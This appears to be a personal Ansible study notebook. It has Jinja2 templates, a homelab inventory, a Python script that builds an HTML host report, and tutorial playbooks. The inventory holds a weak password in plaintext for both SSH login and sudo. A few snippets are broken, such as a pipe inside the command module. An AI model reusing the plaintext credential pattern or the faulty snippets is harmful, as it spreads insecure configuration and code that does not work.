# 3. Loop over a dictionary:
# {% for key, value in simple_dict.items() %}
#    {{ key }}: {{ value }}
# {% endfor %}
#
# 4. Nested loop:
# {% for category, items in nested_dict.items() %}
#    {{ category }}:
#    {% for item in items %}
#      - {{ item }}
#    {% endfor %}
# {% endfor %}
#
# 5. Conditional in loop:
# {% for item in simple_list %}
#    {% if loop.first %}First item: {% endif %}
#    {% if loop.last %}Last item: {% endif %}
#    {{ item }}
# {% endfor %}

# %% [markdown]
# #### **conditionals.j2**

# %% [markdown]
# ---
# ```
# {% if user_type == 'admin' %}
# Welcome, Administrator!
# You have full access to the system.
# {% elif user_type == 'user' %}
# Welcome, User!
# You have limited access to the system.
# {% else %}
# Welcome, Guest!
# You have read-only access to the system.
# {% endif %}
#
# {% if fruits %}
# Available fruits:
# {% for fruit in fruits %}
#   - {{ fruit }}
# {% endfor %}
# {% else %}
# No fruits available.
# {% endif %}
# ```

# %% [markdown]
# #### **filters.j2**

# %% [markdown]
# ---
#
# 1. Uppercase filter: {{ name | upper }}
# 2. Length filter: {{ name | length }}
# 3. Default filter: {{ optional_var | default('No value provided') }}
# 4. Join filter: {{ fruits | join(', ') }}
# 5. Random item: {{ fruits | random }}
# 6. First item: {{ fruits | first }}
# 7. JSON encode: {{ complex_data | to_json }}

# %% [markdown]
# #### **hello.j2**

# %% [markdown]
# ---
# nano hello.j2
# nano use_template.yml
#
# ```
# Hello, {{ name }}!
#
# Today is {{ ansible_date_time.date }}.
# Your home directory is {{ ansible_env.HOME }}.
# ```
#
# {{ name }} is a variable that will be replaced with an actual value when the template is rendered
# {{ ansible_date_time.date }} and {{ ansible_env.HOME }} are Ansible facts that will be automatically populated

# %% [markdown]
# ## Inventory

# %% [markdown]
# # Replace the example names/IPs below with your hosts.
#
# [local]
# #localhost ansible_connection=local ansible_python_interpreter=/usr/bin/python3.14
# cachy_v2 ansible_connection=local ansible_python_interpreter=/usr/bin/python3.14
#
#
# [debian]
# k8s-controller ansible_host=10.0.0.140 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.9
# docker-lxc ansible_host=10.0.0.63 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.10
#
# [rhel]
# k8s-v2 ansible_host=10.0.0.248 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.9
# alma-ansible ansible_host=10.0.0.136 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.9
# alma-selinux ansible_host=10.0.0.141 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.9
# r8airbourne ansible_host=10.0.0.2 ansible_connection=ssh ansible_user=sysadmin
#
# [all:vars]
# ansible_user=sysadmin
# ansible_password=Passw0rd
# ansible_become=true
# ansible_become_method=sudo
# ansible_become_password=Passw0rd
# #ansible_connection=ssh
# #ansible_user=sysadmin
# #ansible_become=true
# #ansible_become_method=sudo
# #
# # ansible all -i inventory.ini -m ping -k --ask-become-pass
# #
# # ansible_user: sysadmin
# # ansible_password: "{{ vault_ansible_password }}"

# %% [markdown]
# ## Machine Html Webpage

# %% [markdown]
# #### Homelab System Report

# %% [markdown]
# to add clickable links
# <a
#     class="quick-link"
#     href="http://SOME-IP:SOME-PORT/"
#     target="_blank"
# >
# 🔗 My Service
# </a>

# %%
import json
import subprocess
from pathlib import Path

inventory = "/home/sysadmin/Documents/ansible/inventory.ini"
facts_dir = Path("/tmp/ansible-facts")
report_path = Path("/home/sysadmin/Documents/homelab-report.html")

# --------------------------------------------------
# 1. Refresh Ansible facts
# --------------------------------------------------

subprocess.run([
    "ansible",
    "all",
    "-i",
    inventory,
    "-m",
    "setup",
    "--tree",
    str(facts_dir)
], check=True)

# --------------------------------------------------
# 2. Parse host facts
# --------------------------------------------------

hosts = []
for host_file in facts_dir.iterdir():
    data = json.loads(host_file.read_text())
    facts = data["ansible_facts"]
    hosts.append({
        "hostname": facts.get("ansible_hostname", host_file.name),
        "os": facts.get("ansible_distribution", "Unknown"),
        "version": facts.get("ansible_distribution_version", "Unknown"),
        "kernel": facts.get("ansible_kernel", "Unknown"),
        "ip": facts.get("ansible_default_ipv4", {}).get("address", "N/A"),
        "cpu": facts.get("ansible_processor_vcpus", "N/A"),
        "memory_mb": facts.get("ansible_memtotal_mb", 0),
        "uptime_seconds": facts.get("ansible_uptime_seconds", 0),
        "load": facts.get("ansible_loadavg", {})
    })

hosts.sort(key=lambda x: x["hostname"])

# --------------------------------------------------
# 3. Build individual host cards
# --------------------------------------------------

host_cards = ""
for host in hosts:
    memory_gb = round(host["memory_mb"] / 1024, 1)
    uptime_days = host["uptime_seconds"] // 86400
    uptime_hours = (host["uptime_seconds"] % 86400) // 3600
    load_1m = host["load"].get("1m", "N/A")
    load_5m = host["load"].get("5m", "N/A")
    load_15m = host["load"].get("15m", "N/A")
    host_cards += f"""
    <div class="host-card">
        <h2>🖥️ {host["hostname"]}</h2>
        <div class="host-grid">
            <div>
                <span class="label">Operating System</span>
                <span>{host["os"]} {host["version"]}</span>
            </div>
            <div>
                <span class="label">IP Address</span>
                <span>{host["ip"]}</span>
            </div>
            <div>
                <span class="label">Kernel</span>
                <span>{host["kernel"]}</span>
            </div>
            <div>
                <span class="label">vCPU</span>
                <span>{host["cpu"]}</span>
            </div>
            <div>
                <span class="label">Memory</span>
                <span>{memory_gb} GB</span>
            </div>
            <div>
                <span class="label">Uptime</span>
                <span>{uptime_days}d {uptime_hours}h</span>
            </div>
            <div>
                <span class="label">Load Average</span>
                <span>{load_1m} / {load_5m} / {load_15m}</span>
            </div>
        </div>
    </div>
    """

# --------------------------------------------------
# 4. Build HTML page
# --------------------------------------------------

html_report = f"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Homelab Systems Report</title>
<style>
body {{
    background: #111;
    color: #eee;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 30px;
}}
.container {{
    max-width: 1200px;
    margin: auto;
}}
.header {{
    margin-bottom: 30px;
}}
.quick-links {{
    display: flex;
    gap: 15px;
    flex-wrap: wrap;
    margin-bottom: 35px;
}}
.quick-link {{
    display: inline-block;
    padding: 12px 20px;
    border: 1px solid #666;
    border-radius: 8px;
    color: #eee;
    text-decoration: none;
    font-weight: bold;
}}
.quick-link:hover {{
    background: #333;
}}
.host-card {{
    border: 1px solid #555;
    border-radius: 12px;
    padding: 22px;
    margin-bottom: 25px;
    background: #181818;
}}
.host-card h2 {{
    margin-top: 0;
    margin-bottom: 20px;
}}
.host-grid {{
    display: grid;
    grid-template-columns:
        repeat(auto-fit, minmax(220px, 1fr));
    gap: 18px;
}}
.host-grid div {{
    padding: 12px;
    border: 1px solid #333;
    border-radius: 8px;
    background: #202020;
}}
.label {{
    display: block;
    font-size: 12px;
    opacity: 0.65;
    margin-bottom: 6px;
    text-transform: uppercase;
}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🏠 Homelab Systems Report</h1>
<p>
Generated automatically using Ansible + Python
</p>
</div>
<h2>🔗 Quick Links</h2>
<div class="quick-links">
<a
    class="quick-link"
    href="http://localhost:8090/"
    target="_blank"
>
🧰 Nagios
</a>
<a
    class="quick-link"
    href="http://10.0.0.140:31080/"
    target="_blank"
>
🌐 Zabbix
</a>
</div>
<h2>🖥️ Systems</h2>
{host_cards}
</div>
</body>
</html>
"""

# --------------------------------------------------
# 5. Save report
# --------------------------------------------------

report_path.write_text(html_report)

print(f"✅ Report refreshed: {report_path}")
print(f"✅ Hosts processed: {len(hosts)}")
# Out:
# [WARNING]: Deprecation warnings can be disabled by setting `deprecation_warnings=False` in ansible.cfg.
# [DEPRECATION WARNING]: The '--tree' argument is deprecated. This feature will be removed from ansible-core version 2.23. Use callback configuration to enable the tree callback instead.
# [DEPRECATION WARNING]: tree has been deprecated. Use another callback plugin, or vendor and/or move the tree callback to a collection. This feature will be removed from ansible-core version 2.23.
# Origin: <unknown>
#
# tree
# k8s-v2 | SUCCESS => {
#     "ansible_facts": {
#         "ansible_all_ipv4_addresses": [
#             "10.42.0.1",
#             "10.0.0.248",
#             "10.42.0.0"
#         ],
#         "ansible_all_ipv6_addresses": [
#             "fe80::d4d9:8cff:fe2c:b209",
#             "fe80::dc4f:24ff:fe1c:20f6",
#             "fe80::d0fe:36ff:fe69:7478",
#             "fe80::905a:2bff:fe8b:78c6",
#             "2601:140:8285:cce0::dc7a",
# ...

# %% [markdown]
# #### Initial Setup

# %%
# !ansible all \
  -i /home/sysadmin/Documents/ansible/inventory.ini \
  -m setup \
  --tree /tmp/ansible-facts

# %%
# !ls -lh /tmp/ansible-facts
# Out:
# total 172K
# -rw-r--r-- 1 sysadmin sysadmin 75K Aug 23 12:43 k8s-controller
# -rw-r--r-- 1 sysadmin sysadmin 96K Aug 23 12:43 localhost

# %%
import json
from pathlib import Path

facts_dir = Path("/tmp/ansible-facts")

files = list(facts_dir.iterdir())

print("Found host files:")
for file in files:
    print("-", file.name)
# Out:
# Found host files:
# - k8s-controller
# - localhost

# %%
host_file = files[0]

data = json.loads(host_file.read_text())

facts = data["ansible_facts"]

print("Host file:", host_file.name)
print("Hostname:", facts.get("ansible_hostname"))
print("OS:", facts.get("ansible_distribution"))
print("Version:", facts.get("ansible_distribution_version"))
print("Kernel:", facts.get("ansible_kernel"))
print("CPU:", facts.get("ansible_processor_vcpus"))
print("Memory MB:", facts.get("ansible_memtotal_mb"))
print("IP:", facts.get("ansible_default_ipv4", {}).get("address"))
# Out:
# Host file: k8s-controller
# Hostname: k8s-controller
# OS: OracleLinux
# Version: 9.8
# Kernel: 5.15.0-321.202.5.3.el9uek.x86_64
# CPU: 2
# Memory MB: 7475
# IP: 10.0.0.140

# %%
hosts = []

for host_file in facts_dir.iterdir():

    data = json.loads(host_file.read_text())
    facts = data["ansible_facts"]

    host = {
        "hostname": facts.get("ansible_hostname", host_file.name),
        "os": facts.get("ansible_distribution", "Unknown"),
        "version": facts.get("ansible_distribution_version", "Unknown"),
        "kernel": facts.get("ansible_kernel", "Unknown"),
        "ip": facts.get("ansible_default_ipv4", {}).get("address", "N/A"),
        "cpu": facts.get("ansible_processor_vcpus", "N/A"),
        "memory_mb": facts.get("ansible_memtotal_mb", 0)
    }

    hosts.append(host)

# %%
for host in hosts:
    print(host)
# Out:
# {'hostname': 'k8s-controller', 'os': 'OracleLinux', 'version': '9.8', 'kernel': '5.15.0-321.202.5.3.el9uek.x86_64', 'ip': '10.0.0.140', 'cpu': 2, 'memory_mb': 7475}
# {'hostname': 'cachyv2', 'os': 'Archlinux', 'version': 'rolling', 'kernel': '7.1.5-1-cachyos', 'ip': '10.0.0.193', 'cpu': 16, 'memory_mb': 15647}

# %%
from IPython.display import HTML, display

rows = ""

for host in hosts:
    memory_gb = round(host["memory_mb"] / 1024, 1)

    rows += f"""
    <tr>
        <td>{host["hostname"]}</td>
        <td>{host["os"]} {host["version"]}</td>
        <td>{host["kernel"]}</td>
        <td>{host["ip"]}</td>
        <td>{host["cpu"]}</td>
        <td>{memory_gb} GB</td>
    </tr>
    """

html = f"""
<div style="
    font-family: sans-serif;
    border: 1px solid #555;
    border-radius: 12px;
    padding: 20px;
">

<h2>🖥️ Homelab Systems Report</h2>

<table style="
    width: 100%;
    border-collapse: collapse;
">

<thead>
<tr>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Hostname</th>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Operating System</th>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Kernel</th>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">IP Address</th>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">vCPU</th>
    <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Memory</th>
</tr>
</thead>

<tbody>
{rows}
</tbody>

</table>

</div>
"""

display(HTML(html))
# Out:
# <div style="
#     font-family: sans-serif;
#     border: 1px solid #555;
#     border-radius: 12px;
#     padding: 20px;
# ">
#
# <h2>🖥️ Homelab Systems Report</h2>
#
# <table style="
#     width: 100%;
#     border-collapse: collapse;
# ">
#
# <thead>
# <tr>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Hostname</th>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Operating System</th>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Kernel</th>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">IP Address</th>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">vCPU</th>
#     <th style="text-align:left; padding:10px; border-bottom:2px solid #666;">Memory</th>
# </tr>
# </thead>
#
# <tbody>
#
#     <tr>
#         <td>k8s-controller</td>
#         <td>OracleLinux 9.8</td>
#         <td>5.15.0-321.202.5.3.el9uek.x86_64</td>
# ...

# %%
from pathlib import Path

report_path = Path("/home/sysadmin/Documents/homelab-report.html")

report_path.write_text(
    f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Homelab Systems Report</title>
</head>

<body style="
    background: #111;
    color: #eee;
    font-family: sans-serif;
    padding: 30px;
">

{html}

</body>
</html>
"""
)

print(f"Report saved to: {report_path}")
# Out:
# Report saved to: /home/sysadmin/Documents/homelab-report.html

# %%
# !ls -lh /home/sysadmin/Documents/homelab-report.html
# Out:
# -rw-r--r-- 1 sysadmin sysadmin 1.6K Aug 23 12:48 /home/sysadmin/Documents/homelab-report.html

# %%
# !xdg-open /home/sysadmin/Documents/homelab-report.html

# %% [markdown]
# ## Definitions

# %% [markdown]
# ---
# #### **Ansible inventory**
# file defines the hosts and groups of hosts upon which commands, modules, and tasks in a playbook operate
#
# #### **Ansible groups**
# They are defined by putting the group name in square brackets []
# Any hosts listed under a group belong to that group
#
# #### **copy module:**
# This module is used to copy files from the local machine to the remote hosts
#
# #### **file module:**
# *is versatile and can be used to create, modify, or delete files and directories*
#
# #### **setup module:**
# This module is used to gather facts about the remote hosts
# *It's automatically run at the beginning of playbooks, but can also be used in ad-hoc commands*
#
# #### **Ansible playbooks**
# are composed of one or more plays, and each play consists of several key elements
#
# #### **debug module**
# is very useful for displaying information during playbook execution, which can help with troubleshooting
#
# #### **Conditionals**
# (when clause) allow you to control task execution based on specific conditions, such as facts about the target system or user-defined variables
# *You can combine multiple conditions using logical operators like and and or to create more complex conditional statements*
#
# #### **Loops**
# (loop keyword) enable you to repeat tasks with different values, increasing efficiency and reducing playbook complexity
# Ansible supports various loop types, including looping over lists, dictionaries, and more complex data structures
# Advanced loop techniques, such as loop_control and looping over dictionaries, provide even more flexibility in handling repetitive tasks
#
# #### **Jinja2 filters**
# are functions that can be applied to variables
#     - They are separated from the variable by a pipe symbol (|)
#     - Ansible includes many built-in filters, and you can also create custom ones
#
# #### **Ansible Role**
# has a defined directory structure with eight main standard directories
# ##### Each directory must contain a main.yml file, which contains the relevant content
#     - tasks - contains the main list of tasks to be executed by the role
#     - handlers - contains handlers, which may be used by this role or outside of this role
#     - defaults - default variables for the role
#     - vars - other variables for the role
#     - files - contains files which can be deployed via this role
#     - templates - contains templates which can be deployed via this role
#     - meta - defines some meta data for this role
#     - tests - contains tests for the role

# %% [markdown]
# ## Playbooks

# %% [markdown]
# #### file_module.yaml

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Check file existence on remote host
#       stat: #This is one of Ansible's modules for getting status information about a file or directory
#         path: /home/labex/file.txt
#       register: file_info #Stores the result of the module execution in the variable file_info using the register keyword
#
#     - name: Print file existence
#       debug: #This is one of the Ansible modules that prints debugging information
#         msg: "File exists: {{ file_info.stat.exists }}" #Use the debug module to print a message with information about the existence of a file, which is retrieved via file_info.stat.exists
#
# ansible-playbook file-module-playbook.yaml
#
# The purpose of this playbook is to check for the existence of the file /home/labex/file.txt on the remote host and print the information to standard output

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Delete a file on remote host
#       file:
#         path: /home/labex/file.txt
#         state: absent #This parameter indicates that the file should be in the absent state
#
# ansible-playbook file-module-playbook.yaml
# ll /home/labex/file.txt
#
# The purpose of this playbook is to delete the file /home/labex/file.txt on the remote host

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Set file permissions
#       file:
#         path: /home/labex/file.txt
#         mode: "0644" #This parameter is used to set the permission mode of the file
#
# ansible-playbook file-module-playbook.yaml
# ll /home/labex/file.txt
#
# The purpose of this playbook is to set the permissions of the file /home/labex/file.txt to 0644

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Create a file on remote host
#       file: #Ansible module to manipulate the file system
#         path: /home/labex/file.txt #Specifies the path to the file, in this case /home/labex/file.txt
#         state: touch #Specifies the state of the file
#
# ansible-playbook file-module-playbook.yaml
# ll /home/labex/file.txt
#
# state: Specifies the state of the file
#     - Here, touch indicates that the file will be created if it does not exist, or updated with access and modification timestamps if it already exists
#
# The purpose of this playbook is to create a file named file.txt on the remote host

# %% [markdown]
# ---
# - name: File Module
#   hosts: localhost
#   become: true
#   gather_facts: true
#   tasks:
#     - name: Create a file on remote host
#       file:
#         path: /home/labex/file.txt
#         state: touch
#
#     - name: Set file permissions
#       file:
#         path: /home/labex/file.txt
#         mode: "0644"
#
#     - name: Delete a file on remote host
#       file:
#         path: /home/labex/file.txt
#         state: absent
#
#     - name: Check file existence on remote host
#       stat:
#         path: /home/labex/file.txt
#       register: file_info
#
#     - name: Print file existence
#       debug:
#         msg: "File exists: {{ file_info.stat.exists }}"

# %% [markdown]
# #### copy_module.yaml

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Idempotent copy
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file2.txt
#         remote_src: yes #yes: This parameter specifies that the src path is on the remote host, allowing Ansible to transfer files from the remote host to another location
#
# Through this playbook task, the file /home/labex/file.txt located on the remote host will be copied to /tmp/file2.txt on the remote host only if it doesn't exist or if the source file has changed

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Handle permissions
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file1.txt
#         mode: "0644"
#
# ansible-playbook copy-module-playbook.yaml
#
# Replace "0644" with the desired permission mode for the file
#     - Refer to the chmod documentation for more information on permission modes

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Preserve file attributes
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file.txt
#         mode: preserve
#
# ansible-playbook copy-module-playbook.yaml
#
# mode:
#   preserve: This parameter preserves the mode (permissions) of the source file during the copy process, ensuring that the destination file retains the same permissions as the source file

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Copy a directory to remote host
#       copy:
#         src: /home/labex/directory
#         dest: /home/labex/project/
#
# ansible-playbook copy-module-playbook.yaml

# %% [markdown]
# - hosts: localhost
#   tasks:
#     - name: Copy a file to remote host
#       copy:
#         src: /home/labex/file.txt
#         dest: /home/labex/project/file.txt
#
# ansible-playbook copy-module-playbook.yaml

# %% [markdown]
# ---
# - name: Copying a File to remote host
#   hosts: localhost
#   become: true
#   gather_facts: true
#   tasks:
#     - name: Copy a file to remote host
#       copy: #Utilizes the Ansible copy module, which is used to copy files from the control node (local host) to a remote host
#         src: /home/labex/file.txt #Specifies the source file path
#         dest: /home/labex/project/file.txt #Specifies the destination file path
#
#     - name: Copy a directory to remote host
#       copy:
#         src: /home/labex/directory
#         dest: /home/labex/project/
#
#     - name: Preserve file attributes
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file.txt
#         mode: preserve
#
#     - name: Handle permissions
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file1.txt
#         mode: "0644"
#
#     - name: Idempotent copy
#       copy:
#         src: /home/labex/file.txt
#         dest: /tmp/file2.txt
#         remote_src: yes

# %% [markdown]
# #### apt_installs.yaml

# %% [markdown]
# ---
# - name: Docker Compose Install
#   hosts: localhost
#   become: true
#   gather_facts: true
#
#   tasks:
#     - name: Install a package
#       become: yes
#       apt:
#         name: docker-compose
#         state: present #installing the package
#
#     - name: Update a package
#       become: yes
#       apt:
#         name: docker-compose
#         state: latest #updating the package
#
#     - name: Remove a package
#       become: yes
#       apt:
#         name: docker-compose
#         state: absent #removes the package

# %% [markdown]
# #### complex_shell_commands.yaml

# %% [markdown]
# ---
# - name: Execute Complex Shell Commands
#   hosts: localhost
#   gather_facts: true
#
#   tasks:
#     - name: Execute complex command
#       shell: ls -l /home/sysadmin | grep 'project' > /home/sysadmin/output.txt
#       register: complex_command_output
#
#     - name: Display complex command output
#       debug:
#         var: complex_command_output.stdout_lines

# %% [markdown]
# #### handle_command_failure.yaml

# %% [markdown]
# ---
# - name: Handle Command Failure
#   hosts: localhost
#   gather_facts: true
#
#   tasks:
#     - name: Execute a failing command
#       shell: failing-command #This line uses the shell module to execute the command failing-command
#       register: failing_command_output
#       ignore_errors: yes #This line instructs Ansible to ignore any errors that occur during the execution of the failing-command -- This allows the playbook to continue executing even if the command fails
#
#     - name: Handle command failure
#       debug: #This module uses the debug module to display a message that says "The command failed. Performing fallback action."
#         msg: "The command failed. Performing fallback action."
#       when: failing_command_output.failed

# %% [markdown]
# #### pass_variables.yaml

# %% [markdown]
# ---
# - name: Pass Variables to Shell Commands
#   hosts: localhost
#   gather_facts: true
#   vars:
#     directory_path: /home/sysadmin/Documents
#
#   tasks:
#     - name: Execute ls command with a variable
#       shell: ls "{{ directory_path }}"
#       register: variable_command_output
#
#     - name: Display variable command output
#       debug:
#         var: variable_command_output.stdout_lines

# %% [markdown]
# #### simple_shell_command.yaml

# %% [markdown]
# ---
# - name: Execute a Simple Shell Command
#   hosts: localhost
#   gather_facts: false
#
#   tasks:
#     - name: Execute ls -l command
#       shell: ls -l
#       register: command_output
#
#     - name: Display command output
#       debug:
#         var: command_output.stdout_lines

# %% [markdown]
# #### ssh_service_checker.yaml

# %% [markdown]
# ---
# - name: Check and manage SSH service in Docker
#   hosts: localhost
#   become: yes # This allows Ansible to use sudo
#   tasks:
#     - name: Check SSH service status
#       command: service ssh status
#       register: ssh_status
#       ignore_errors: yes
#
#     - name: Display SSH service status
#       debug:
#         msg: "SSH service status: {{ ssh_status.stdout }}"
#
#     - name: Start SSH service if not running
#       command: service ssh start
#       when: ssh_status.rc != 0
#
#     - name: Verify SSH service is running
#       command: service ssh status
#       register: ssh_status_after
#
#     - name: Display final SSH service status
#       debug:
#         msg: "SSH service status is now: {{ ssh_status_after.stdout }}"
#
#     - name: Check if SSH port is listening
#       command: netstat -tuln | grep :22
#       register: ssh_port_check
#       ignore_errors: yes
#
#     - name: Display SSH port status
#       debug:
#         msg: "SSH port 22 is {{ 'open' if ssh_port_check.rc == 0 else 'closed' }}"

# %% [markdown]
# #### command_options.yaml

# %% [markdown]
# ---
# - name: Explore Command module options
#   hosts: localhost
#   tasks:
#     - name: Run a command with a specific working directory
#       command: pwd
#       args:
#         chdir: /tmp
#
#     - name: Run a command with environment variables
#       command: echo $MY_VAR
#       environment:
#         MY_VAR: "Hello from Ansible"
#
#     - name: Run a command and ignore errors
#       command: ls /nonexistent_directory
#       ignore_errors: yes
#
#     - name: Run a command with a timeout
#       command: sleep 2
#       async: 5
#       poll: 0
#       register: sleep_result
#
#     - name: Check sleep command status
#       async_status:
#         jid: "{{ sleep_result.ansible_job_id }}"
#       register: job_result
#       until: job_result.finished
#       retries: 5
#       delay: 1
#
# ansible-playbook command_options.yaml
#
# chdir: Changes the working directory before executing the command
# environment: Sets environment variables for the command
# ignore_errors: Continues playbook execution even if the command fails
# async and poll: Runs the command asynchronously with a timeout

# %% [markdown]
# #### process_output.yaml

# %% [markdown]
# ---
# - name: Capture and process command output
#   hosts: all
#   tasks:
#     - name: Get disk usage information
#       command: df -h
#       register: df_output
#
#     - name: Display all partitions
#       debug:
#         msg: "{{ df_output.stdout_lines }}"
#
#     - name: Find root partition
#       set_fact:
#         root_partition: "{{ df_output.stdout_lines | select('match', '\\s+/$') | first | default('') }}"
#
#     - name: Display root partition information
#       debug:
#         msg: "Root partition: {{ root_partition }}"
#       when: root_partition != ''
#
#     - name: Extract usage percentage
#       set_fact:
#         root_usage: "{{ root_partition.split()[-2].rstrip('%') | int }}"
#       when: root_partition != ''
#
#     - name: Display root partition usage
#       debug:
#         msg: "Root partition is {{ root_usage }}% full"
#       when: root_partition != ''
#
#     - name: Check if root partition is over 80% full
#       fail:
#         msg: "Warning: Root partition is over 80% full!"
#       when: root_partition != '' and root_usage > 80
#
#     - name: Display message if root partition not found
#       debug:
#         msg: "Root partition (/) not found in df output"
#       when: root_partition == ''

# %% [markdown]
# #### variable_command.yaml

# %% [markdown]
# ---
# - name: Use variables with the Command module
#   hosts: all
#   vars:
#     file_path: /etc/passwd
#     line_count: 5
#   tasks:
#     - name: Display the last few lines of a file
#       command: "tail -n {{ line_count }} {{ file_path }}"
#       register: command_output
#
#     - name: Show the command output
#       debug:
#         var: command_output.stdout_lines
#
# ansible-playbook variable_command.yaml
#
# The vars section: defines variables that can be used throughout the playbook
# {{ variable_name }} syntax: to reference variables within the command
# The register keyword: saves the output of the command to a variable named command_outpu
# The debug module: is used to display the contents of the command_output variable

# %% [markdown]
# #### simple_command.yaml

# %% [markdown]
# ---
# - name: Execute a simple command
#   hosts: localhost
#   tasks:
#     - name: Run 'ls' command
#       command: ls -l
#
# ansible-playbook simple_command.yml -i inventory.ini -k
#
# The command: ls -l line uses the Command module to run the ls -l command

# %% [markdown]
# #### roles.yaml

# %% [markdown]
# ##### tasks.yaml

# %% [markdown]
# ---
# - name: Print a message
#   debug:
#     msg: "This is a task from our example role!"
#
# - name: Use our variable
#   debug:
#     msg: "The value of example_variable is: {{ example_variable }}"
#
# - name: Create a file from our template
#   template:
#     src: example_template.j2
#     dest: /tmp/example_file.txt
#   notify: Restart example service---
# - name: Print a message
#   debug:
#     msg: "This is a task from our example role!"
#
# mkdir -p roles/example_role
# cd roles/example_role
# mkdir {tasks,handlers,defaults,vars,files,templates,meta}

# %% [markdown]
# ##### main.yaml

# %% [markdown]
# ---
# example_variable: "This is a default value"
#
# nano defaults/main.yml

# %% [markdown]
# ##### handlers.yaml

# %% [markdown]
# ---
# - name: Restart example service
#   debug:
#     msg: "This would restart a service in a real scenario"
#
# nano handlers/main.yml

# %% [markdown]
# ##### example_template.j2

# %% [markdown]
# This is an example template
# The value of example_variable is: {{ example_variable }}
#
# nano templates/example_template.j2

# %% [markdown]
# #### advance_jinja_loops.yaml

# %% [markdown]
# ---
# ```
# - name: Use advanced Jinja2 techniques
#   hosts: localhost
#   vars:
#     name: "Ansible Expert"
#     fruits:
#       - apple
#       - banana
#       - cherry
#     vegetables:
#       - carrot
#       - potato
#       - broccoli
#     complex_data:
#       key1: value1
#       key2:
#         - item1
#         - item2
#     custom_filters:
#       to_nice_json: "{{ '(' ~ ((complex_data | to_json) | replace('\"', '\\\"')) ~ ')' | from_json | to_nice_json }}"
#   tasks:
#     - name: Create file from template
#       template:
#         src: templates/advanced.j2
#         dest: /tmp/advanced.txt
#
#     - name: Display file contents
#       command: cat /tmp/advanced.txt
#       register: file_contents
#
#     - name: Show file contents
#       debug:
#         var: file_contents.stdout_lines
# ```

# %% [markdown]
# #### jinja_loops.yaml

# %% [markdown]
# ---
# ```
# - name: Use Jinja2 loops
#   hosts: localhost
#   vars:
#     simple_list:
#       - apple
#       - banana
#       - cherry
#     simple_dict:
#       name: John Doe
#       age: 30
#       city: New York
#     nested_dict:
#       fruits:
#         - apple
#         - banana
#       vegetables:
#         - carrot
#         - potato
#   tasks:
#     - name: Create file from template
#       template:
#         src: templates/loops.j2
#         dest: /tmp/loops.txt
#
#     - name: Display file contents
#       command: cat /tmp/loops.txt
#       register: file_contents
#
#     - name: Show file contents
#       debug:
#         var: file_contents.stdout_lines
# ```

# %% [markdown]
# #### jinja_conditionas.yaml

# %% [markdown]
# ---
# - name: Use Jinja2 conditionals
#   hosts: localhost
#   vars:
#     user_type: "admin"
#     fruits:
#       - apple
#       - banana
#       - cherry
#   tasks:
#     - name: Create file from template (admin)
#       template:
#         src: templates/conditionals.j2
#         dest: /tmp/conditionals_admin.txt
#
#     - name: Create file from template (user)
#       template:
#         src: templates/conditionals.j2
#         dest: /tmp/conditionals_user.txt
#       vars:
#         user_type: "user"
#
#     - name: Create file from template (guest)
#       template:
#         src: templates/conditionals.j2
#         dest: /tmp/conditionals_guest.txt
#       vars:
#         user_type: "guest"
#         fruits: []
#
#     - name: Display file contents
#       command: "cat {{ item }}"
#       loop:
#         - /tmp/conditionals_admin.txt
#         - /tmp/conditionals_user.txt
#         - /tmp/conditionals_guest.txt
#       register: file_contents
#
#     - name: Show file contents
#       debug:
#         var: file_contents.results[item].stdout_lines
#       loop: [0, 1, 2]

# %% [markdown]
# #### jinja2_filters.yaml

# %% [markdown]
# ---
# - name: Use Jinja2 filters
#   hosts: localhost
#   vars:
#     name: "ansible learner" #Defines a text variable named name
#     fruits: #Defines a list containing three fruit names
#       - apple
#       - banana
#       - cherry
#     complex_data: #Defines a dictionary with two keys
#       key1: value1 #key1 contains the value value1
#       key2: #key2 contains a list with item1 and item2
#         - item1
#         - item2
#   tasks:
#     - name: Create file from template
#       template: #The template module
#         src: templates/filters.j2 #Reads templates/filters.j2 -- Replaces its Jinja2 expressions with values from the playbook
#         dest: /tmp/filters.txt #Writes the resulting content to /tmp/filters.txt
#
#     - name: Display file contents #Task 2: Read the file --
#       command: cat /tmp/filters.txt #This displays the file contents
#       register: file_contents #The register keyword saves the command result in a variable called file_contents
#
#     - name: Show file contents #Show the saved output
#       debug: #The debug module prints the value of file_contents.stdout_lines
#         var: file_contents.stdout_lines #stdout_lines contains the command output as a list, with one list item per line

# %% [markdown]
